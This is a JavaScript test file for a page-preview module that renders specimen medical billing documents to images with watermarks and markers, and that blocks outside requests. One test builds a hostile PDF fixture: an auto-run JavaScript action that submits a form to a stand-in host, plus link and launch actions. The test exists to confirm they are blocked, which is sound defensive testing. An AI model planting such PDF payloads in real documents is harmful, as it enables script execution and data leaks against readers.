// Page images (preview.js): every document type is drawn with its specimen band and watermark, every image file
// carries the specimen markers, the size budget is kept, and the drawing page loads nothing but its own files,
// whatever the PDF asks for.
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { render, launchBrowser, findChrome, BAND_TEXT, SPECIMEN_SUBJECT } from '@claimseed/core';
import { PDFDocument, PDFName, PDFString } from 'pdf-lib';
import { previewPages } from '../src/preview.js';
import { readMarkers } from './markers-read.js';

const skip = !findChrome() && !process.env.CI && 'no Chrome (set CLAIMSEED_CHROME); never skipped in CI';
let browser;
before(async () => { if (!skip) browser = await launchBrowser(); });
after(async () => { await browser?.close(); });

// Pixel facts of an image, measured in the browser: the share of the bottom band rows in the band's fill colour, and
// the share of the middle of the page in the watermark's tint (the stamp's colour at 14% over white).
async function pixels(img) {
  const page = await browser.newPage();
  try {
    return await page.evaluate(async (src) => {
      const im = new Image(); im.src = src; await im.decode();
      const c = document.createElement('canvas'); c.width = im.width; c.height = im.height;
      const ctx = c.getContext('2d'); ctx.drawImage(im, 0, 0);
      const near = (d, i, [r, g, b], tol) => Math.abs(d[i] - r) <= tol && Math.abs(d[i + 1] - g) <= tol && Math.abs(d[i + 2] - b) <= tol;
      const scale = Math.max(im.width, im.height) / 792;   // pixels per point on a Letter page
      const band = ctx.getImageData(0, im.height - Math.round(1.8 * scale), im.width, 1).data;   // under the band's text
      let inBand = 0; for (let i = 0; i < band.length; i += 4) if (near(band, i, [251, 243, 234], 6)) inBand++;
      const mid = ctx.getImageData(Math.round(im.width * 0.2), Math.round(im.height * 0.3), Math.round(im.width * 0.6), Math.round(im.height * 0.4)).data;
      let tint = 0; for (let i = 0; i < mid.length; i += 4) if (near(mid, i, [245, 231, 223], 8)) tint++;
      return { width: im.width, height: im.height, band: inBand / (band.length / 4), tint: tint / (mid.length / 4) };
    }, `data:${img.mimeType};base64,${img.data}`);
  } finally { await page.close(); }
}

test('every document type is drawn page by page, each page with the specimen band and the watermark', { skip, timeout: 180000 }, async () => {
  for (const [type, scenario] of [['msn', 'combined-three-errors'], ['itemized-bill', 'duplicate-charge'], ['ppo-eob', 'baseline-clean'], ['hmo-eob', 'baseline-clean']]) {
    const { bytes, groundTruth } = await render({ type, scenario, seed: 'preview-1', browser });
    const seen = [];
    const label = `${type} / ${scenario} / seed preview-1`;
    const p = await previewPages(browser, bytes, { pages: 'all', budget: 1e8, label, onRequest: (u, served) => seen.push([u, served]) });
    assert.equal(p.pageCount, groundTruth.documents[0].pages, type);
    assert.deepEqual(p.images.map((i) => i.page), Array.from({ length: p.pageCount }, (_, i) => i + 1), `${type}: every page`);
    for (const img of p.images) {
      assert.equal(Math.max(img.width, img.height), 1200, `${type} p${img.page}: size`);
      const px = await pixels(img);
      assert.ok(px.band > 0.5, `${type} p${img.page}: specimen band missing (${px.band.toFixed(2)})`);
      assert.ok(px.tint > 0.005, `${type} p${img.page}: watermark missing (${px.tint.toFixed(4)})`);
      assert.deepEqual(readMarkers(img.mimeType, img.data), { description: BAND_TEXT, disclaimer: SPECIMEN_SUBJECT, label }, `${type} p${img.page}: file markers`);
    }
    for (const [u, served] of seen) {
      assert.ok(served, `${type}: the page asked for something it was not given: ${u.slice(0, 80)}`);
      assert.match(u, /^https:\/\/preview\.claimseed\.invalid\/(|main\.mjs|pdf\.min\.mjs|pdf\.worker\.min\.mjs|document\.pdf|standard_fonts\/[A-Za-z-]+\.(pfb|ttf))$/, type);
    }
  }
});

test('pages after from_page, within the budget: the first page shrinks to fit, later pages stop at the limit', { skip, timeout: 60000 }, async () => {
  const { bytes } = await render({ type: 'msn', scenario: 'baseline-clean', seed: 'preview-2', browser });
  const all = await previewPages(browser, bytes, { pages: 'all', budget: 600 * 1024 });
  const used = all.images.reduce((n, i) => n + i.data.length, 0);
  assert.ok(used <= 600 * 1024 && all.images.length >= 1 && all.images.length < all.pageCount, `${all.images.length} pages, ${used} bytes`);
  const from = await previewPages(browser, bytes, { pages: 'first', from: 3, budget: 1e8 });
  assert.deepEqual(from.images.map((i) => i.page), [3]);
  const past = await previewPages(browser, bytes, { pages: 'all', from: 99, budget: 1e8 });
  assert.deepEqual(past.images, []);
  const tiny = await previewPages(browser, bytes, { pages: 'all', budget: 60 * 1024 });
  assert.equal(tiny.images.length, 1);
  assert.ok(Math.max(tiny.images[0].width, tiny.images[0].height) < 1200, 'the first page is drawn smaller to fit');
});

test('a PDF that asks for script, links, a form submit or remote files gets none of them', { skip, timeout: 60000 }, async () => {
  const doc = await PDFDocument.create();
  const page = doc.addPage([612, 792]);
  page.drawText('hostile', { x: 72, y: 700, size: 24 });
  const js = doc.context.obj({ Type: 'Action', S: 'JavaScript', JS: PDFString.of('app.alert("x"); this.submitForm("https://example.invalid/f");') });
  doc.catalog.set(PDFName.of('OpenAction'), doc.context.register(js));
  const link = doc.context.obj({ Type: 'Annot', Subtype: 'Link', Rect: [72, 600, 300, 640], A: { S: 'URI', URI: PDFString.of('https://example.invalid/l') } });
  const launch = doc.context.obj({ Type: 'Annot', Subtype: 'Link', Rect: [72, 500, 300, 540], A: { S: 'Launch', F: PDFString.of('https://example.invalid/r.pdf') } });
  page.node.set(PDFName.of('Annots'), doc.context.obj([doc.context.register(link), doc.context.register(launch)]));
  page.node.set(PDFName.of('AA'), doc.context.obj({ O: js }));
  const seen = [];
  const p = await previewPages(browser, Buffer.from(await doc.save()), { pages: 'all', budget: 1e8, onRequest: (u, served) => seen.push([u, served]) });
  assert.equal(p.images.length, 1);
  const px = await pixels(p.images[0]);   // an unstamped page: the band and watermark measures read nothing
  assert.ok(px.band < 0.05 && px.tint < 0.0005, JSON.stringify(px));
  assert.deepEqual(seen.filter(([u]) => !u.startsWith('https://preview.claimseed.invalid/')), []);
  assert.deepEqual(seen.filter(([, served]) => !served), []);
});

test('a page that only fits as a JPEG carries the markers too, and still decodes with its band and watermark', { skip, timeout: 60000 }, async () => {
  const { bytes } = await render({ type: 'itemized-bill', scenario: 'baseline-clean', seed: 'preview-3', browser });
  const p = await previewPages(browser, bytes, { pages: 'first', budget: 30 * 1024, label: 'itemized-bill / baseline-clean / seed preview-3' });
  const [img] = p.images;
  assert.equal(img.mimeType, 'image/jpeg');
  const m = readMarkers(img.mimeType, img.data);
  assert.equal(m.description, BAND_TEXT); assert.equal(m.software, 'claimseed');
  assert.match(m.comment, /not a real document/); assert.match(m.comment, /itemized-bill \/ baseline-clean \/ seed preview-3/);
  const px = await pixels(img);
  assert.ok(px.width > 0 && px.band > 0.5, JSON.stringify(px));
});
